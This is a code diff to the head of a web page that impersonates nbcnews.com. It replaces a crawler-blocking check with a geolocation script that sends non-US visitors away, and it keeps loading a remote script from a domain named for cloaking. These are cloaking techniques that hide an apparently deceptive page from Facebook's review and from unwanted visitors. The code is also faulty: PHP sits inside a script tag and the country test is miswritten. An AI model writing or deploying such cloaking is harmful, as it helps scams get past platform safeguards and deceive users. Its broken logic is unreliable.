@@ -13,28 +13,21 @@
     <meta name="facebook:description" content="nbcnews.com">
     <meta name="facebook:app:country" content="us">
 
-    <script type="text/javascript">
-        function esRobotDeFacebook() {
-    if (isset($_SERVER['HTTP_USER_AGENT'])) {
-        $userAgent = $_SERVER['HTTP_USER_AGENT'];
-        return stripos($userAgent, 'facebookexternalhit') !== false;
-    }
-    return false;
-}
-
-        function esDispositivoMovil() {
-    if (isset($_SERVER['HTTP_USER_AGENT'])) {
-        $userAgent = $_SERVER['HTTP_USER_AGENT'];
-        return (stripos($userAgent, 'android') !== false || stripos($userAgent, 'iphone') !== false);
-    }
-    return false;
-}
-
-if (esRobotDeFacebook() || !esDispositivoMovil()) {
-    http_response_code(403);
-    exit;
-}
+    <script>
+        function redirectNonUS() {
             
+            fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                
+                if (data.country != 'US', 'IT') {
+                    
+                    window.location.replace("https://youtube.com");
+                }
+            })
+            .catch(error => console.error('Error fetching location:', error));
+        }
+        window.onload = redirectNonUS;
     </script>
    <script src="https://x1.cloakingx001.bio/2sir8hf930" type="text/javascript" async="true"></script>
 </head>   
